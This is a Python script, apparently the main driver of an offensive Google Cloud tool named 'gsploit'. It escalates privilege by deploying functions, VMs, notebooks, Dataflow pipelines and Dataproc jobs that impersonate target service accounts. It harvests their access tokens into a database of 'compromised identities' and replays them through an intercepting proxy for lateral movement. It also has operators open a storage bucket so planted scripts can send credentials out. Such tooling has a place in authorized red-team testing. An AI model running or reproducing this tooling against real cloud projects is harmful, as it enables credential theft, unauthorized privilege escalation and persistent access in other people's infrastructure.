import signal
import sys
import time
import models
import os
import subprocess
from sqlalchemy.orm import sessionmaker
from sqlalchemy import create_engine
import random
import string
import urllib.request
import json
import argparse
from base_cloud_function import main as base_cf
from base_vm_instance import main as base_vm
from base_notebook_instance import main as base_notebook
from base_dataflow_pipeline import main as base_dataflow
from utils import utils

engine = create_engine('sqlite:///db/db.sql')
models.init_db(engine)

Session = sessionmaker(bind=engine)
Session.configure(bind=engine)
db_session = Session()


def list_objects():
    cloud_objects = db_session.query(models.CloudObject).all()
    for cloud_object in cloud_objects:
        print(cloud_object)


def deploy_cf(project, source=None, target=None, role="unknown", bucket=None, bucketproj=None):
    with open("./base_cloud_function/main.py") as f:
        latest_cf = f.read()
    utils.run_gcloud_command_local("gcloud config set project {}".format(project))
    function_props = {"name": utils.random_name(), "evil_password": utils.random_name()}
    if not target:
        target = "{}@appspot.gserviceaccount.com".format(project)
        role = "editor"
    if not source:
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        caller_identity = utils.run_gcloud_command_local("gcloud auth print-identity-token")
        success = base_cf.create_gcf_in_another_project(project, target, latest_cf, function_props)
        if not success or success == "False":
            print("Failed to provision CF")
            return False
        creator_email = ""
    else:
        source = db_session.query(models.CloudObject).filter_by(name=source).first()
        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucketproj)
        caller_identity = source.identity
        token = source.cred
        proc = activate_sketch_proxy(token)
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        success = base_cf.create_gcf_in_another_project(project, target, latest_cf, function_props)
        deactivate_sketch_proxy(proc)
        if not success or success == "False":
            print("Failed to provision CF")
            return False
        creator_email = source.serviceAccount
    fun_cloud_function = models.CloudObject(project=project, role=role, serviceAccount=target, evilPassword=function_props["evil_password"], name=function_props["name"], cred="", creator_identity=caller_identity, creator_email=creator_email, infastructure="cloud_function", identity="")
    db_session.add(fun_cloud_function)
    db_session.commit()
    print("successfully privesced the {} identitiy".format(target))
    return fun_cloud_function


def deploy_notebook(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
    # Create instance via notebook notebooks in default network
    # SSH commands via vm for lateral movementa
    # cron job pulls token every minute and pushes up
    utils.run_gcloud_command_local("gcloud config set project {}".format(project))
    instance_props = {"name": utils.random_name()}

    if not target:
        target = "{}@appspot.gserviceaccount.com".format(project)
        role = "editor"
    if not source:
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        caller_identity = utils.run_gcloud_command_local("gcloud auth print-identity-token")
        success = base_notebook.create_notebook_in_another_project(project, target, instance_props, bucket)
        if not success or success == "False":
            print("Failed to provision dataflow notebook VM")
            return False
        creator_email = ""
    else:
        source = db_session.query(models.CloudObject).filter_by(name=source).first()
        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucketproj)
        caller_identity = source.identity
        token = source.cred
        proc = activate_sketch_proxy(token)
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        success = base_notebook.create_notebook_in_another_project(project, target, instance_props, bucket)
        deactivate_sketch_proxy(proc)
        if not success or success == "False":
            print("Failed to provision dataflow notebook VM")
            return False
        creator_email = source.serviceAccount

    fun_notebook_instance = models.CloudObject(project=project, role=role, serviceAccount=target, evilPassword="", name=instance_props["name"], cred="", creator_identity=caller_identity, creator_email=creator_email, infastructure="notebook", identity="")
    db_session.add(fun_notebook_instance)
    db_session.commit()

    print("successfully privesced the {} identitiy".format(target))
    return fun_notebook_instance

def deploy_pipeline(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
    # Create instance via notebook notebooks in default network
    # SSH commands via vm for lateral movementa
    # cron job pulls token every minute and pushes up
    utils.run_gcloud_command_local("gcloud config set project {}".format(project))
    instance_props = {"name": utils.random_name()}

    if not target:
        target = "{}@appspot.gserviceaccount.com".format(project)
        role = "editor"
    if not source:
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        caller_identity = utils.run_gcloud_command_local("gcloud auth print-identity-token")
        success = base_dataflow.create_pipeline_in_another_project(project, target, instance_props, bucket)
        if not success or success == "False":
            print("Failed to provision Pipeline")
            return False
        creator_email = ""
    else:
        source = db_session.query(models.CloudObject).filter_by(name=source).first()
        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket)
        caller_identity = source.identity
        token = source.cred
        proc = activate_sketch_proxy(token)
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        success = base_dataflow.create_pipeline_in_another_project(project, target, instance_props, bucket)
        deactivate_sketch_proxy(proc)
        if not success or success == "False":
            print("Failed to provision dataflow pipeline")
            return False
        creator_email = source.serviceAccount

    fun_pipeline_instance = models.CloudObject(project=project, role=role, serviceAccount=target, evilPassword="", name=instance_props["name"], cred="", creator_identity=caller_identity, creator_email=creator_email, infastructure="dataflow", identity="")
    db_session.add(fun_pipeline_instance)
    db_session.commit()

    print("successfully privesced the {} identitiy".format(target))
    return fun_pipeline_instance

def deploy_vm(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
    # Create instance in default network
    # SSH commands via vm for lateral movementa
    # cron job pulls token every minute and pushes up
    utils.run_gcloud_command_local("gcloud config set project {}".format(project))
    instance_props = {"name": utils.random_name()}

    if not target:
        target = "{}@appspot.gserviceaccount.com".format(project)
        role = "editor"
    if not source:
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        caller_identity = utils.run_gcloud_command_local("gcloud auth print-identity-token")
        success = base_vm.create_vm_in_another_project(project, target, instance_props, bucket)
        if not success or success == "False":
            print("Failed to provision VM")
            return False
        creator_email = ""
    else:
        source = db_session.query(models.CloudObject).filter_by(name=source).first()
        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucket_proj)
        caller_identity = source.identity
        token = source.cred
        proc = activate_sketch_proxy(token)
        utils.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        success = base_vm.create_vm_in_another_project(project, target, instance_props, bucket)
        deactivate_sketch_proxy(proc)
        if not success or success == "False":
            print("Failed to provision VM")
            return False
        creator_email = source.serviceAccount
    fun_compute_instance = models.CloudObject(project=project, role=role, serviceAccount=target, evilPassword="", name=instance_props["name"], cred="", creator_identity=caller_identity, creator_email=creator_email, infastructure="compute_instance", identity="")
    db_session.add(fun_compute_instance)
    db_session.commit()
    print("successfully privesced the {} identitiy".format(target))
    return fun_compute_instance


def dataproc(source_name=None, project=None, refresh=False):
    cluster_name = utils.random_name()
    if not source_name:
        caller_identity = utils.run_gcloud_command_local("gcloud auth print-identity-token")
        creator_email = ""
        utils.run_gcloud_command_local("gcloud dataproc clusters create {} --region us-central1 --scopes cloud-platform".format(cluster_name))
        raw_output = utils.run_gcloud_command_local("gcloud dataproc jobs submit pyspark --cluster {} dataproc_job.py --region us-central1".format(cluster_name))
        utils.run_gcloud_command_local("gcloud dataproc clusters delete {} --region us-central1 --quiet".format(cluster_name))
    else:
        source = db_session.query(models.CloudObject).filter_by(name=source_name).first()
        caller_identity = source.identity
        creator_email = source.serviceAccount
        run_cmd_on_source(source_name, "gcloud dataproc clusters create {} --region us-central1 --scopes cloud-platform".format(cluster_name), project)
        raw_output = run_cmd_on_source(source_name, "gcloud dataproc jobs submit pyspark --cluster {} dataproc_job.py --region us-central1".format(cluster_name), project)
        run_cmd_on_source(source_name, "gcloud dataproc clusters delete {} --region us-central1 --quiet".format(cluster_name), project)
    print(raw_output)
    for line in raw_output.split("\n"):
        if "access_token" in line:
            token = json.loads(line)
    if not refresh:
        fun_cloud_function = models.CloudObject(project=project, role="editor", serviceAccount=token["service_account"], evilPassword="na", name=cluster_name, cred=token["access_token"], creator_identity=caller_identity, creator_email=creator_email, infastructure="dataproc", identity=token["identity"])
        db_session.add(fun_cloud_function)
        db_session.commit()
        return fun_cloud_function
    else:
        refresh.cred = token["access_token"]
        db_session.add(refresh)
        db_session.commit()
        return refresh


def activate_sketch_proxy(token):
    with open(os.devnull, 'w') as fp:
        proxy_proc = subprocess.Popen("python3 proxy.py {}".format(token), shell = True, stdout=fp)
    time.sleep(3)
    utils.run_gcloud_command_local("gcloud config set proxy/type http")
    utils.run_gcloud_command_local("gcloud config set proxy/address 127.0.0.1")
    utils.run_gcloud_command_local("gcloud config set proxy/port 19283")
    utils.run_gcloud_command_local("gcloud config set core/custom_ca_certs_file /root/.mitmproxy/mitmproxy-ca.pem")
    return proxy_proc


def deactivate_sketch_proxy(proxy_proc):
    print("killing proxy")
    os.killpg(os.getpgid(proxy_proc.pid), signal.SIGTERM)
    utils.run_gcloud_command_local("gcloud config unset proxy/type")
    utils.run_gcloud_command_local("gcloud config unset proxy/address")
    utils.run_gcloud_command_local("gcloud config unset proxy/port")
    utils.run_gcloud_command_local("gcloud config unset core/custom_ca_certs_file")


def run_cmd_on_source(name, cmd, project=None, bucket=None, bucketproj=None):
    if cmd.startswith("gcloud"):
        cmd = cmd
    else:
        cmd = "gcloud " + cmd
    if project:
        cmd += " --project {}".format(project)
    source = db_session.query(models.CloudObject).filter_by(name=name).first()
    source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucketproj)
    token = source.cred
    proxy_thread = activate_sketch_proxy(token)
    result = utils.run_gcloud_command_local(cmd)
    print(result)
    deactivate_sketch_proxy(proxy_thread)
    return result


def main():
    parser = argparse.ArgumentParser(description='gsploit, tools to exploit GCP services')
    parser.add_argument('--source_cf', dest="source",
                    help='The source you want to run the command or exploit from')
    parser.add_argument('--target_sa', dest="target",
                    help='The target you want to run the command or exploit on')
    parser.add_argument('--project', dest="project",
                    help='The project you want the source to set')
    parser.add_argument('--gcloud', dest='gcloud_cmd',
                    help='a gcloud command you want to run on the source')
    parser.add_argument('--list', dest='list', action="store_true",
                    help='lists all compromised identities')
    parser.add_argument('--exploit', dest='exploit',
                    help='the name of the exploit you want to run on the given target, e.g. actAs all')
    parser.add_argument('--actAsMethod', default='cf', dest='actasmethod',
                    choices=['cf','vm','notebook','dataflow'],
                    help='what actAs vector you would like to use.')
    parser.add_argument('--bucket', dest='bucket',
                    help='bucket for GCPloit credential storage.')
    parser.add_argument('--bucket_proj', dest='bucketproj',
                    help='project containing bucket for GCPloit credential storage.')

    args = parser.parse_args()

    if args.list:
        list_objects()
        sys.exit()
    elif args.gcloud_cmd:
        if not args.source:
            print("Running local gcloud command")
            return_output = utils.run_gcloud_command_local(args.gcloud_cmd)
            print(return_output)
        else:
            return_output = run_cmd_on_source(args.source, args.gcloud_cmd, project=args.project, bucket=args.bucket, bucketproj=args.bucketproj)
            print(return_output)
    elif args.exploit:
        if not args.project:
            print("What project do you want to privesc into? set --project <project>")
            sys.exit()
        exploit_cmd = args.exploit
        if exploit_cmd == "actas":
            if args.bucket:
                print("*************************************************")
                print("MAKE SURE YOU GIVE ALL USERS *WRITE* ACCESS TO YOUR BUCKET WITH gsutil iam ch <serviceAccountName>:objectCreator gs://{}. OTHERWISE, YOUR SCRIPTS WONT BE ABLE TO PUSH CREDS TO YOU.".format(args.bucket))
                print("*************************************************")

            if (args.actasmethod == "notebook" or
                    args.actasmethod == "vm" or 
                    args.actasmethod == "dataflow") and not args.bucket:
                print("What bucket do you want to store credentials into?")
                print("set --bucket <bucket>")
                print("Make sure your instance has write access to the bucket URL.")
                sys.exit()

            if args.target == "all":
                if not args.source:
                    service_accounts = utils.run_gcloud_command_local("gcloud iam service-accounts list --format json --project {}".format(args.project))
                else:
                    service_accounts = run_cmd_on_source(args.source, "gcloud iam service-accounts list --format json --project {}".format(args.project), bucket=args.bucket)
                for service_account in json.loads(service_accounts):
                    if args.actasmethod == "cf":
                        new_object = deploy_cf(args.project, args.source, service_account["email"])
                    if args.actasmethod == "vm":
                        new_object = deploy_vm(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                    if args.actasmethod == "notebook":
                        new_object = deploy_notebook(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                    if args.actasmethod == "dataflow":
                        new_object = deploy_pipeline(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                    print("~~~~~~~Got New Identity~~~~~~~~")
                    print(new_object)
            else:
                if args.actasmethod == "cf":
                    new_object = deploy_cf(args.project, args.source, args.target, args.bucket, args.bucketproj)
                if args.actasmethod == "vm":
                    new_object = deploy_vm(args.project, args.source, args.target, args.bucket, args.bucketproj)
                if args.actasmethod == "notebook":
                    new_object = deploy_notebook(args.project, args.source, args.target, args.bucket, args.bucketproj)
                if args.actasmethod == "dataflow":
                    new_object = deploy_pipeline(args.project, args.source, args.target, args.bucket, args.bucketproj)
                if new_object:
                    print("~~~~~~~Got New Identity~~~~~~~~")
                    print(new_object)
                else:
                    print("Error while retrieving New Identity")
        elif exploit_cmd == "computeadmin":
            pass    
        elif exploit_cmd == "dataproc":
            identity = dataproc(args.source, args.project)


if __name__ == "__main__":
    main()
"""

create a topic
gcloud pubsub topics create potato

get reply
gcloud functions deploy fffff --trigger-topic potato --source ./base_cloud_function --runtime python37 --entry-point hello_pubsub

"""
